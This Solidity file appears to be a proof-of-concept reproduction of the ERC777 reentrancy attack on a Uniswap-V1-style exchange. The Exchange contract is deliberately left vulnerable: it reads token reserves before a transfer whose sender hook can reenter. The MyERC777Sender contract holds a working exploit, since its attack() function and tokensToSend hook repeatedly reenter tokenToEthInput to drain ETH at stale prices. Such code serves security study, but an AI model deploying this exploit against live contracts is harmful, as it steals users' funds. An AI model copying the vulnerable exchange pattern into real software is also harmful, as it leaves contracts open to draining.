// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

import "node_modules/openzeppelin-solidity-3.4.0/token/ERC777/ERC777.sol";
import "node_modules/openzeppelin-solidity-3.4.0/introspection/IERC1820Registry.sol";
import "node_modules/openzeppelin-solidity-3.4.0/introspection/ERC1820Implementer.sol";

import "node_modules/openzeppelin-solidity-3.4.0/token/ERC777/IERC777Sender.sol";

import "node_modules/openzeppelin-solidity-3.4.0/token/ERC777/IERC777Recipient.sol";




contract MyERC777Token is ERC777 {
    constructor(
        uint256 initialSupply,
        address[] memory defaultOperators,
        address registry
    ) ERC777("MyERC777Token", "MET", defaultOperators, registry){
        _mint(msg.sender, initialSupply, "", "");
    }



}


contract Exchange {

    MyERC777Token token;
    constructor(address _token) payable {
        token = MyERC777Token(_token);
    }


    // function deposit() external payable  {
    //     token._mint(msg.sender, msg.value, 0, 0); //eth to CCRT
    // }

    
    function tokenToEthInput(uint256 tokensSold) public returns (uint256) {
        address buyer = msg.sender;
        address recipient = msg.sender;
        uint256 tokenReserve = token.balanceOf(address(this)); // this value did not updated should be increased 
        uint256 ethBought = getInputPrice(tokensSold, tokenReserve, address(this).balance);
        
        require(address(this).balance >= ethBought, "Insufficient contract balance.");
        
        // Send ETH to the recipient
        // (bool sent, ) = recipient.call{value: ethBought}("");
        // require(sent, "Failed to send Ether");

        // Transfer tokens from the buyer to this contract
        bool isTransferFromSuccess = token.transferFrom(buyer, address(this), tokensSold);
        require(isTransferFromSuccess, "Token transfer failed.");


        // !!!!!!!!!!!!!this two line are changed from original code but 
        // original vuln from tokenToTOkenInput is doing this thing inside of the function.
        (bool sent, ) = recipient.call{value: ethBought}("");
        require(sent, "Failed to send Ether");

        // emit EthPurchase(buyer, tokensSold, ethBought);

        return ethBought;
    }

    function ethToTokenInput() public payable returns (uint256) {
        uint256 tokenReserve = token.balanceOf(address(this));
        uint256 ethReserve = address(this).balance - msg.value; // ETH reserve before the transaction
        uint256 tokensBought = getInputPrice(msg.value, ethReserve, tokenReserve);

        require(tokensBought >= 1, "Insufficient tokens bought");
        require(token.transfer(msg.sender, tokensBought), "Token transfer failed");
        return tokensBought;
    }

      // Function to calculate input price, assuming it exists in this contract
    function getInputPrice(uint256 inputAmount, uint256 inputReserve, uint256 outputReserve) public pure returns (uint256) {
        require(inputReserve > 0 && outputReserve > 0, "Invalid reserves");
        uint256 inputAmountWithFee = inputAmount * 997;
        uint256 numerator = inputAmountWithFee * outputReserve;
        uint256 denominator = (inputReserve * 1000) + inputAmountWithFee;
        return numerator / denominator;
    }

    //  function getInputPrice(uint256 ethSold, uint256 ethReserve, uint256 tokenReserve) public pure returns (uint256) {
    //     // Dummy implementation - replace this with your actual pricing logic
    //     return ethSold * tokenReserve / ethReserve;
    // }

    function getOutputPrice(uint256 outputAmount, uint256 inputReserve, uint256 outputReserve) public pure returns (uint256) {
        require(inputReserve > 0 && outputReserve > 0, "Invalid reserves");
        uint256 numerator = inputReserve * outputAmount * 1000;
        uint256 denominator = (outputReserve - outputAmount) * 997;
        return numerator / denominator + 1;
    }

    // function tokenToTokenInput(uint256 tokensSold, uint256 minTokensBought, uint256 minEthBought, uint256 deadline, address buyer, address recipient, address exchangeAddr) public returns (uint256) {
    //     require(deadline >= block.timestamp && tokensSold > 0, "Invalid deadline or tokensSold");
    //     require(minTokensBought > 0 && minEthBought > 0, "Invalid minTokensBought or minEthBought");
    //     require(exchangeAddr != address(this) && exchangeAddr != ZERO_ADDRESS, "Invalid exchange address");



    //     uint256 tokenReserve = token.balanceOf(address(this)); // this value still not updated
    //     uint256 ethBought = getInputPrice(tokensSold, tokenReserve, address(this).balance);

    //     require(ethBought >= minEthBought, "Insufficient ETH bought");

    //     require(token.transferFrom(buyer, address(this), tokensSold), "Token transfer failed");

    //     // Call ethToTokenTransferInput on the specified exchange
    //     uint256 tokensBought = IExchange(exchangeAddr).ethToTokenTransferInput{value: ethBought}(minTokensBought, deadline, recipient);


    //     return tokensBought;
    // }
}

contract MyERC777Sender is IERC777Sender, ERC1820Implementer {
    IERC1820Registry private _ERC1820_REGISTRY ;

    uint256 public numSend = 0;
    address public lastReceivedFrom;

    function getNum() public view returns(uint256){
      return numSend;
    }


    Exchange exchange;

    MyERC777Token victim ;

    constructor(address registry, address _victim, address _exchange) payable{
        _ERC1820_REGISTRY = IERC1820Registry(registry);
        // register to ERC1820 registry
        _ERC1820_REGISTRY.setInterfaceImplementer(
        address(this),
        _ERC1820_REGISTRY.interfaceHash("ERC777TokensSender"),
        address(this)
        );

        victim = MyERC777Token(_victim);
        exchange = Exchange(_exchange);

      

    }

    function attack() external {
      uint256 input_value = exchange.ethToTokenInput{value: 100 ether}();
      require(input_value != 0, "input_value error");

      bool ret = victim.approve(address(exchange), victim.balanceOf(address(this)));
      require(ret == true, "approve failed");
      uint256 output = exchange.tokenToEthInput(1 ether);
    }

    function tokensToSend(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external override {
        numSend +=1; 
        if(numSend < 90){
            exchange.tokenToEthInput(1 ether);
        }
    }

    receive() external payable {}
}




contract MyERC777Recipient is IERC777Recipient, ERC1820Implementer {
  IERC1820Registry private _ERC1820_REGISTRY ;

  uint256 public numTimesReceived = 0; // we can known received token info. this is feature of erc777
  address public lastReceivedFrom;

  constructor(address registry) {
    _ERC1820_REGISTRY = IERC1820Registry(registry);
    // register to ERC1820 registry
    _ERC1820_REGISTRY.setInterfaceImplementer(
      address(this),
      _ERC1820_REGISTRY.interfaceHash("ERC777TokensRecipient"),
      address(this)
    );
  }

    // this function called when token is received.
  function tokensReceived(
    address, /* operator */
    address from,
    address, /* to */
    uint256, /* amount */
    bytes calldata, /* userData */
    bytes calldata /* operatorData */
  ) external override {
    lastReceivedFrom = from;
    numTimesReceived++;
  }
}


